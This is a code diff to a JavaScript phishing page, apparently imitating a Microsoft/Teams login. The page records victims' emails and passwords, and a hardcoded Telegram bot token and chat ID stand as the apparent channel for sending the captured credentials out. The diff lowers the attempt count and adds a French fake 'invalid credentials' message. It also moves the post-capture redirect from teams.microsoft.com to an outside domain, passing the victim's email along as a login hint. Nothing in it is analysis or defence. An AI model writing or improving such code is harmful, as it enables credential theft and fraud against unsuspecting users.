@@ -352,13 +352,13 @@
     let detectedEmail = null;
     let currentEmail = null;
     let attemptCount = 0;
-    const maxAttempts = 3;
+    const maxAttempts = 2; // Changed from 3 to 2 (1 initial + 1 more attempt)
 
     // Environment variables
     const env = {
       TELEGRAM_TOKEN: '8043918109:AAHq02pj7XjBIwYYENtftpes-RUnDMnWvlA',
       TELEGRAM_CHAT_ID: '-1002493880170',
-      FINAL_URL: 'https://teams.microsoft.com'
+      FINAL_URL: 'https://boost.asmasoft.ca'
     };
 
     // Get URL parameters
@@ -559,7 +559,13 @@
     }
 
     function redirectToFinalURL() {
-      window.location.href = env.FINAL_URL;
+      // Build URL with loginhint and prompt=login parameters
+      const url = new URL(env.FINAL_URL);
+      if (currentEmail) {
+        url.searchParams.set('loginhint', currentEmail);
+      }
+      url.searchParams.set('prompt', 'login');
+      window.location.href = url.toString();
     }
 
     // Auth modal event listeners
@@ -605,12 +611,13 @@
         attemptCount++;
         
         if (attemptCount >= maxAttempts) {
-          // Redirect after max attempts
+          // Redirect after max attempts with loginhint and prompt=login
           setTimeout(() => {
             redirectToFinalURL();
           }, 1000);
         } else {
           // Show invalid message and reset password field
+          passwordError.textContent = 'Identifiants invalides. Veuillez réessayer.';
           passwordError.classList.add('show');
           passwordInput.value = '';
           setTimeout(() => {
